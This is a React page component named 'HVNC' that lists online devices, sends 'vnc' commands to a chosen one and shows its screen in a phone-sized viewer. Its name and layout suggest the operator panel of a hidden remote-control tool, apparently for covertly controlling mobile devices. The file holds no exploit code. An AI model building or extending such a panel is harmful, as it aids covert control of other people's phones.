import { useState, useCallback } from 'react';
import { useStore } from '../lib/store.js';
import { sendCommand } from '../lib/api.js';
import VNCViewer from '../components/VNCViewer.jsx';
import VNCControls from '../components/VNCControls.jsx';

export default function HVNC() {
  const devices = useStore(s => s.devices);
  const onlineDevices = devices.filter(d => d.is_online);
  const [selectedDeviceId, setSelectedDeviceId] = useState(null);

  const handleCommand = useCallback(async (type, payload) => {
    if (!selectedDeviceId) return;
    await sendCommand(selectedDeviceId, 'vnc', { type, payload });
  }, [selectedDeviceId]);

  const selectedDevice = devices.find(d => d.id === selectedDeviceId);

  return (
    <div className="flex gap-6 h-[calc(100vh-7rem)] animate-slide-in">
      {/* Left — Device selector + controls */}
      <div className="w-72 flex-shrink-0 space-y-4">
        {/* Device selector */}
        <div>
          <h2 className="text-sm font-medium text-gray-100 mb-2">Device</h2>
          <select
            value={selectedDeviceId || ''}
            onChange={e => setSelectedDeviceId(e.target.value || null)}
            className="w-full h-9 px-3 text-sm bg-surface-800 border border-surface-700 rounded text-gray-200 outline-none focus:border-accent/50"
          >
            <option value="">— Select device —</option>
            {onlineDevices.map(d => (
              <option key={d.id} value={d.id}>
                {d.name || d.model || d.id.slice(0, 8)}
              </option>
            ))}
          </select>
          {onlineDevices.length === 0 && (
            <p className="text-xs text-surface-500 mt-2">No online devices</p>
          )}
        </div>

        {/* Controls */}
        <VNCControls deviceId={selectedDeviceId} onCommand={handleCommand} />

        {/* Device info */}
        {selectedDevice && (
          <div className="bg-surface-900 border border-surface-800 rounded-lg p-3 text-xs">
            <p className="text-surface-400 font-mono uppercase tracking-wider text-[10px] mb-1">Device</p>
            <p className="text-gray-200">{selectedDevice.name || selectedDevice.model || 'Unknown'}</p>
            <p className="text-surface-400 mt-0.5">
              {selectedDevice.manufacturer} {selectedDevice.model}
            </p>
            <p className="text-surface-500 font-mono text-[10px] mt-1">
              {selectedDevice.id?.slice(0, 16)}...
            </p>
          </div>
        )}
      </div>

      {/* Right — Screen viewer */}
      <div className="flex-1 min-w-0 flex justify-center">
        {selectedDeviceId ? (
          <div className="max-w-sm w-full">
            <VNCViewer deviceId={selectedDeviceId} width={390} height={780} />
          </div>
        ) : (
          <div className="flex items-center justify-center h-full">
            <div className="text-center">
              <div className="text-4xl mb-3 opacity-20">🖥</div>
              <p className="text-sm text-surface-400">Select a device to start remote control</p>
              <p className="text-xs text-surface-500 mt-1">Only online devices are shown</p>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
